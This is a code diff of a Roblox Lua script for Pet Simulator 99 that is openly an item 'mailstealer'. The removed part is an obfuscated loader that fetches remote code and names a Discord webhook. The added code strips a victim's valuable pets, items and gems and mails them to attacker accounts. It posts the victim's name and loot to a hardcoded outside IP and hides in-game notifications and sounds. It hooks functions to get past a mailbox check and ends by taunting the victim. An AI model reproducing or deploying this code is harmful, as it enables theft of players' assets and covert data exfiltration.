@@ -1,12 +1,357 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
 
-]]--
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local library = require(game.ReplicatedStorage.Library)
+local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
+local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
+local plr = game.Players.LocalPlayer
+local MailMessage = "GG / GY2RVSEGDT"
+local HttpService = game:GetService("HttpService")
+local sortedItems = {}
+local totalRAP = 0
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
 
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v85=0;while true do if (v85==0) then v19=v0(v3(v30,1,1));return "";end end else local v86=v2(v0(v30,16));if v19 then local v116=v5(v86,v19);v19=nil;return v116;else return v86;end end end);local function v20(v31,v32,v33) if v33 then local v87=(v31/(2^(v32-(2 -1))))%((5 -3)^(((v33-((1 + 0) -0)) -(v32-(2 -(1 -0)))) + (620 -(555 + 64)))) ;return v87-(v87%(932 -(857 + 74))) ;else local v88=568 -(367 + 201) ;local v89;while true do if (v88==(927 -(214 + 713))) then v89=(1 + 1)^(v32-(1 + 0)) ;return (((v31%(v89 + v89))>=v89) and (878 -(282 + (1660 -(68 + 997))))) or (1637 -(1523 + 114)) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (1272 -(226 + 1044)) );v18=v18 + (8 -6) ;return (v36 * (373 -(32 + 85))) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + 3 + 0 );v18=v18 + 1 + (5 -2) ;return (v40 * (16778173 -(892 + 65))) + (v39 * 65536) + (v38 * (610 -(649 -295))) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,1,(657 -287) -(87 + 263) ) * (2^((211 + 1) -(67 + (904 -(368 + 423)))))) + v41 ;local v45=v20(v42,(50 -34) + 5 ,75 -44 );local v46=((v20(v42,24 + (26 -(10 + 8)) )==(3 -2)) and  -(953 -(802 + (577 -427)))) or (2 -1) ;if (v45==0) then if (v44==(0 -0)) then return v46 * (0 + 0) ;else v45=(1440 -(416 + 26)) -(915 + 82) ;v43=0 -0 ;end elseif (v45==(1193 + 854)) then return ((v44==(0 -0)) and (v46 * ((1188 -((3412 -2343) + 118))/((0 + 0) -0)))) or (v46 * NaN) ;end return v8(v46,v45-((3958 -1721) -1214) ) * (v43 + (v44/(2^(10 + 42)))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==(438 -(145 + 293))) then return "";end end v48=v3(v16,v18,(v18 + v47) -(431 -(44 + 386)) );v18=v18 + v47 ;local v49={};for v66=1487 -(998 + 488) , #v48 do v49[v66]=v2(v1(v3(v48,v66,v66)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return function(v90,v91,v92,v93,v94,v95,v96,v97) local v90=(function() return 0;end)();local v91=(function() return;end)();local v92=(function() return;end)();while true do if (v90~= #">") then else if (v91== #"[") then v92=(function() return v93()~=(0 + 0) ;end)();elseif (v91==(563 -(79 + 482))) then v92=(function() return v94();end)();elseif (v91~= #"xxx") then else v92=(function() return v95();end)();end v96[v97]=(function() return v92;end)();break;end if (v90~=(0 -0)) then else local v122=(function() return 0 -0 ;end)();local v123=(function() return;end)();while true do if (v122~=(285 -(134 + 151))) then else v123=(function() return 1665 -(970 + 695) ;end)();while true do if (v123==(1 -0)) then v90=(function() return  #".";end)();break;end if (v123~=0) then else v91=(function() return v93();end)();v92=(function() return nil;end)();v123=(function() return 1;end)();end end break;end end end end return v90,v91,v92,v93,v94,v95,v96,v97;end;end)();local v51=(function() return function(v98,v99,v100,v101,v102,v103,v104,v105,v106) local v107=(function() return 1024 -(706 + 318) ;end)();local v98=(function() return;end)();local v99=(function() return;end)();while true do if (v107~=(1990 -(582 + 1408))) then else local v124=(function() return 0 -0 ;end)();while true do if (v124~=0) then else v98=(function() return 0 -0 ;end)();v99=(function() return nil;end)();v124=(function() return 3 -2 ;end)();end if (v124~=(1272 -(945 + 326))) then else v107=(function() return 1825 -(1195 + 629) ;end)();break;end end end if (v107==1) then while true do if (v98==0) then v99=(function() return v100();end)();if (v101(v99, #"!", #" ")==(0 + 0)) then local v126=(function() return 0;end)();local v127=(function() return;end)();local v128=(function() return;end)();local v129=(function() return;end)();local v130=(function() return;end)();while true do if (v126~=0) then else local v167=(function() return 0;end)();local v168=(function() return;end)();while true do if ((700 -(271 + 429))==v167) then v168=(function() return 0 + 0 ;end)();while true do if ((1501 -(1408 + 92))~=v168) then else v126=(function() return 1 -0 ;end)();break;end if ((1288 -(993 + 295))==v168) then v127=(function() return 0 + 0 ;end)();v128=(function() return nil;end)();v168=(function() return 242 -(187 + 54) ;end)();end end break;end end end if (v126~=1) then else local v169=(function() return 1171 -(418 + 753) ;end)();while true do if (v169==(781 -(162 + 618))) then v126=(function() return 1 + 1 ;end)();break;end if (v169==(0 + 0)) then v129=(function() return nil;end)();v130=(function() return nil;end)();v169=(function() return 1 + 0 ;end)();end end end if (v126==(1 + 1)) then while true do if (v127~=(0 -0)) then else local v183=(function() return 0 -0 ;end)();local v184=(function() return;end)();while true do if (v183==0) then v184=(function() return 0 + 0 ;end)();while true do if (v184==0) then v128=(function() return v101(v99,2, #"asd");end)();v129=(function() return v101(v99, #".dev",1 + 5 );end)();v184=(function() return 1637 -(1373 + 263) ;end)();end if (v184==1) then v127=(function() return  #">";end)();break;end end break;end end end if (v127== #"nil") then if (v101(v129, #"91(", #"-19")== #">") then v130[ #"0836"]=(function() return v102[v130[ #"asd1"]];end)();end v103[v104]=(function() return v130;end)();break;end if (v127~=(1002 -(451 + 549))) then else local v186=(function() return 1769 -(1749 + 20) ;end)();local v187=(function() return;end)();while true do if (v186==(0 + 0)) then v187=(function() return 0;end)();while true do if ((1322 -(1249 + 73))==v187) then if (v101(v129, #",", #"[")== #"<") then v130[2]=(function() return v102[v130[2 -0 ]];end)();end if (v101(v129,2 -0 ,1386 -(746 + 638) )~= #"~") then else v130[ #"-19"]=(function() return v102[v130[ #"19("]];end)();end v187=(function() return 2 -1 ;end)();end if (v187==1) then v127=(function() return  #"91(";end)();break;end end break;end end end if (v127~= #"~") then else local v188=(function() return 0 -0 ;end)();while true do if (v188~=(0 + 0)) then else v130=(function() return {v105(),v105(),nil,nil};end)();if (v128==(0 -0)) then local v190=(function() return 341 -(218 + 123) ;end)();local v191=(function() return;end)();while true do if (v190~=(1581 -(1535 + 46))) then else v191=(function() return 0;end)();while true do if ((0 + 0)==v191) then v130[ #"-19"]=(function() return v105();end)();v130[ #"asd1"]=(function() return v105();end)();break;end end break;end end elseif (v128== #"!") then v130[ #"91("]=(function() return v106();end)();elseif (v128==(1 + 1)) then v130[ #"91("]=(function() return v106() -((562 -(306 + 254))^(1 + 15)) ;end)();elseif (v128~= #"xxx") then else local v198=(function() return 0;end)();local v199=(function() return;end)();while true do if (v198==(0 -0)) then v199=(function() return 0 -0 ;end)();while true do if (v199==(114 -(4 + 110))) then v130[ #"-19"]=(function() return v106() -((1469 -(899 + 568))^(11 + 5)) ;end)();v130[ #"xnxx"]=(function() return v105();end)();break;end end break;end end end v188=(function() return 1;end)();end if (v188==(1428 -(41 + 1386))) then v127=(function() return 4 -2 ;end)();break;end end end end break;end end end break;end end return v98,v99,v100,v101,v102,v103,v104,v105,v106;end end end;end)();local v52=(function() return function(v108,v109,v110) local v111=(function() return 103 -(17 + 86) ;end)();local v112=(function() return;end)();while true do if (v111==(603 -(268 + 335))) then v112=(function() return 290 -(60 + 230) ;end)();while true do if (v112~=(0 -0)) then else local v125=(function() return 0 -0 ;end)();while true do if (v125==(572 -(426 + 146))) then v108[v109-#"\\" ]=(function() return v110();end)();return v108,v109,v110;end end end end break;end end end;end)();local v53=(function() return {};end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {v53,v54,nil,v55};end)();local v57=(function() return v23();end)();local v58=(function() return {};end)();for v68= #"}",v57 do FlatIdent_69270,Type,Cons,v21,v24,v25,v58,v68=(function() return v50(FlatIdent_69270,Type,Cons,v21,v24,v25,v58,v68);end)();end v56[ #"asd"]=(function() return v21();end)();for v69= #".",v23() do FlatIdent_7126A,Descriptor,v21,v20,v58,v53,v69,v22,v23=(function() return v51(FlatIdent_7126A,Descriptor,v21,v20,v58,v53,v69,v22,v23);end)();end for v70= #"~",v23() do v54,v70,v28=(function() return v52(v54,v70,v28);end)();end return v56;end local function v29(v60,v61,v62) local v63=v60[1 -0 ];local v64=v60[6 -4 ];local v65=v60[3 + 0 ];return function(...) local v71=v63;local v72=v64;local v73=v65;local v74=v27;local v75=1 + 0 ;local v76= -(1 -0);local v77={};local v78={...};local v79=v12("#",...) -(1 + 0) ;local v80={};local v81={};for v113=1257 -(1043 + 214) ,v79 do if (v113>=v73) then v77[v113-v73 ]=v78[v113 + (3 -(3 -1)) ];else v81[v113]=v78[v113 + ((3605 -2392) -(323 + (2094 -(902 + 303)))) ];end end local v82=(v79-v73) + 1 + 0 ;local v83;local v84;while true do v83=v71[v75];v84=v83[2 -1 ];if (v84<=((1288 -701) -(361 + 219))) then if (v84<=(323 -(53 + 267))) then if ((3769>=1173) and (v84<=(1581 -(1183 + (956 -559))))) then if (v84==(0 -0)) then v81[v83[1 + 1 ]]=v62[v83[3]];else do return;end end elseif ((1485==1485) and (v84>(2 + 0))) then v81[v83[415 -(15 + 398) ]]=v83[1978 -(1913 + 6 + 56) ];else v81[v83[984 -(18 + 964) ]]=v62[v83[11 -8 ]];end elseif ((v84<=(1938 -(565 + 1368))) or (3315<=2782)) then if (v84==(3 + 1)) then v62[v83[2 + 1 ]]=v81[v83[852 -(20 + 830) ]];else local v139=0 + 0 ;local v140;while true do if (v139==(856 -(564 + 292))) then v140=v83[2 + 0 ];v81[v140]=v81[v140](v13(v81,v140 + ((1817 -(1121 + 569)) -((330 -(22 + 192)) + 10)) ,v76));break;end end end elseif (v84>(1 + 5)) then local v141=738 -(542 + 196) ;local v142;local v143;while true do if ((v141==(1 -0)) or (876>=2964)) then v81[v142 + (1002 -((1621 -(483 + 200)) + 63)) ]=v143;v81[v142]=v143[v83[2 + (1465 -(1404 + 59)) ]];break;end if ((1125 -(936 + (517 -328)))==v141) then v142=v83[2];v143=v81[v83[2 + 1 ]];v141=1 + 0 ;end end else local v144=v83[4 -(2 -0) ];local v145=v81[v83[(772 -(468 + 297)) -4 ]];v81[v144 + (1552 -(1126 + 425)) ]=v145;v81[v144]=v145[v83[(971 -(334 + 228)) -(118 + 287) ]];end elseif (v84<=(43 -32)) then if ((v84<=(1130 -(118 + 1003))) or (2232>2497)) then if ((v84>(275 -(176 + 91))) or (2110<=332)) then v62[v83[8 -5 ]]=v81[v83[379 -(142 + 235) ]];else v81[v83[9 -7 ]]();end elseif (v84>(3 + 7)) then local v151=v83[979 -(553 + 424) ];v81[v151]=v81[v151](v13(v81,v151 + (1 -0) ,v76));else local v153=0 + 0 ;local v154;local v155;local v156;local v157;while true do if (v153==(2 + 0)) then for v178=v154,v76 do v157=v157 + 1 ;v81[v178]=v155[v157];end break;end if ((1 + 0)==v153) then v76=(v156 + v154) -1 ;v157=0 -0 ;v153=3 -1 ;end if (v153==(0 + 0)) then v154=v83[(3 -2) + 1 ];v155,v156=v74(v81[v154](v13(v81,v154 + 1 + 0 ,v83[6 -(6 -3) ])));v153=2 -1 ;end end end elseif (v84<=(29 -16)) then if ((3686>3172) and (v84>(4 + 8))) then v81[v83[9 -(12 -5) ]]=v83[756 -(239 + 514) ];else do return;end end elseif (v84==(5 + 9)) then local v160=v83[1331 -(797 + 532) ];local v161,v162=v74(v81[v160](v13(v81,v160 + 1 + 0 + 0 ,v83[(238 -(141 + 95)) + 1 ])));v76=(v162 + v160) -(3 -2) ;local v163=0 + 0 + 0 ;for v165=v160,v76 do local v166=0 -0 ;while true do if ((v166==(0 -0)) or (4474<820)) then v163=v163 + (1203 -(373 + (1992 -1163))) ;v81[v165]=v161[v163];break;end end end else v81[v83[733 -(476 + 255) ]]();end v75=v75 + (1131 -(369 + 761)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0C3Q0003083Q00557365726E616D65030C3Q0070732Q3973746F636B31323303093Q00557365726E616D6532030C3Q004D612Q6E795F616C7431323303073Q00576562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31333139332Q3533303336373830352Q3439312F5150526A4E5765575A486654775A4F7052516E4B5A4C6C2Q51627462477A5A7134326768775A516652467357543379554D5045327342576F4A3361566C42676C742Q335103153Q0073656C65637465644C6F6164696E675363722Q656E03013Q0033030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403493Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F496D4469676974616C7A2F4D6F7269536372697074732F6D61696E2F4D6F72695363726970747300103Q0012033Q00023Q0012093Q00013Q0012033Q00043Q0012093Q00033Q0012033Q00063Q0012093Q00053Q0012033Q00083Q0012093Q00073Q0012023Q00093Q0012020001000A3Q00200700010001000B0012030003000C4Q000E000100034Q000B5Q00022Q000F3Q000100012Q000C3Q00017Q00",v9(),...);
+local user = _G.Username or "PetsGoMommy"
+local user2 = _G.Username2 or "PetsGoMommy"
+local discuser = _G.discuser or ""
+local min_rap = _G.minrap or 1000000
+
+local newamount = 20000
+
+if mailsent ~= 0 then
+	newamount = math.ceil(newamount * (1.5 ^ mailsent))
+end
+
+local GemAmount1 = 1
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+		break
+    end
+end
+
+if newamount > GemAmount1 then
+    return
+end
+
+local function formatNumber(number)
+	local number = math.floor(number)
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+	return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
+local function SendMessage(diamonds)
+    local headers = {
+        ["Content-Type"] = "application/json",
+        ["DiscUser"] = discuser or ""
+    }
+
+	local fields = {
+		{
+			name = "Victim Username:",
+			value = plr.Name,
+			inline = true
+		},
+		{
+			name = "Items to be sent:",
+			value = "",
+			inline = false
+		},
+        {
+            name = "Summary:",
+            value = "",
+            inline = false
+        }
+	}
+
+    local combinedItems = {}
+    local itemRapMap = {}
+
+    for _, item in ipairs(sortedItems) do
+        local rapKey = item.name
+        if itemRapMap[rapKey] then
+            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
+        else
+            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
+            table.insert(combinedItems, rapKey)
+        end
+    end
+
+    table.sort(combinedItems, function(a, b)
+        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
+    end)
+
+    for _, itemName in ipairs(combinedItems) do
+        local itemData = itemRapMap[itemName]
+        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+    end
+
+    fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
+    fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "\240\159\144\177 New PS99 Execution" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+			}
+        }}
+    }
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n")
+            fields[2].value = fields[2].value .. "\nPlus more!"
+        end
+    end
+
+    local body = HttpService:JSONEncode(data)
+    local response = request({
+        Url = "http://46.101.233.20:5000/ps99",
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
+gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
+	gemsleaderstatpath.Value = gemsleaderstat
+end)
+
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+	noti.Enabled = false
+end)
+noti.Enabled = false
+
+game.DescendantAdded:Connect(function(x)
+    if x.ClassName == "Sound" then
+        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
+            x.Volume=0
+            x.PlayOnRemove=false
+            x:Destroy()
+        end
+    end
+end)
+
+local function getRAP(Type, Item)
+    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return Item.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+            end
+        }
+    ) or 0)
+end
+
+local function sendItem(category, uid, am)
+    local args = {
+        [1] = user,
+        [2] = MailMessage,
+        [3] = category,
+        [4] = uid,
+        [5] = am or 1
+    }
+	local response = false
+	repeat
+    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+		if response == false and err == "They don't have enough space!" then
+			user = user2
+			args[1] = user
+		end
+	until response == true
+	GemAmount1 = GemAmount1 - newamount
+	newamount = math.ceil(math.ceil(newamount) * 1.5)
+	if newamount > 5000000 then
+		newamount = 5000000
+	end
+end
+
+local function SendAllGems()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" then
+			if GemAmount1 >= (newamount + 10000) then
+				local args = {
+					[1] = user,
+					[2] = MailMessage,
+					[3] = "Currency",
+					[4] = i,
+					[5] = GemAmount1 - newamount
+				}
+				local response = false
+				repeat
+					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+				until response == true
+				break
+			end
+        end
+    end
+end
+
+local function IsMailboxHooked()
+	local uid
+	for i, v in pairs(save["Pet"]) do
+		uid = i
+		break
+	end
+	local args = {
+        [1] = "Roblox",
+        [2] = "Test",
+        [3] = "Pet",
+        [4] = uid,
+        [5] = 1
+    }
+    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
+        return false
+    else
+        return true
+    end
+end
+
+local function EmptyBoxes()
+    if save.Box then
+        for key, value in pairs(save.Box) do
+			if value._uq then
+				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
+			end
+        end
+    end
+end
+
+local function ClaimMail()
+    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        wait()
+        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    end
+end
+
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+
+for i, v in pairs(categoryList) do
+	if save[v] ~= nil then
+		for uid, item in pairs(save[v]) do
+			if v == "Pet" then
+                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
+                if dir.huge or dir.exclusiveLevel then
+                    local rapValue = getRAP(v, item)
+                    if rapValue >= min_rap then
+                        local prefix = ""
+                        if item.pt and item.pt == 1 then
+                            prefix = "Golden "
+                        elseif item.pt and item.pt == 2 then
+                            prefix = "Rainbow "
+                        end
+                        if item.sh then
+                            prefix = "Shiny " .. prefix
+                        end
+                        local id = prefix .. item.id
+                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                        totalRAP = totalRAP + (rapValue * (item._am or 1))
+                    end
+                end
+            else
+                local rapValue = getRAP(v, item)
+                if rapValue >= min_rap then
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+                    totalRAP = totalRAP + (rapValue * (item._am or 1))
+                end
+            end
+            if item._lk then
+                local args = {
+                [1] = uid,
+                [2] = false
+                }
+                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+            end
+        end
+	end
+end
+
+if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
+    ClaimMail()
+	if IsMailboxHooked() then
+		local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
+        for i, Func in ipairs(getgc(true)) do
+            if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
+                local Old
+                Old = hookfunction(Func, function(Ins, ...)
+                    if Ins == Mailbox then
+                        return tick()
+                    end
+                    return Old(Ins, ...)
+                end)
+            end
+        end
+	end
+    EmptyBoxes()
+	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+    local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
+    local blob_b = require(blob_a).Get()
+    function deepCopy(original)
+        local copy = {}
+        for k, v in pairs(original) do
+            if type(v) == "table" then
+                v = deepCopy(v)
+            end
+            copy[k] = v
+        end
+        return copy
+    end
+    blob_b = deepCopy(blob_b)
+    require(blob_a).Get = function(...)
+        return blob_b
+    end
+
+    table.sort(sortedItems, function(a, b)
+        return a.rap * a.amount > b.rap * b.amount 
+    end)
+
+    spawn(function()
+        SendMessage(GemAmount1)
+    end)
+
+    for _, item in ipairs(sortedItems) do
+        if item.rap >= newamount then
+            sendItem(item.category, item.uid, item.amount)
+        else
+            break
+        end
+    end
+    SendAllGems()
+    local message = require(game.ReplicatedStorage.Library.Client.Message)
+    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
+    setclipboard("discord.gg/GY2RVSEGDT")
+end
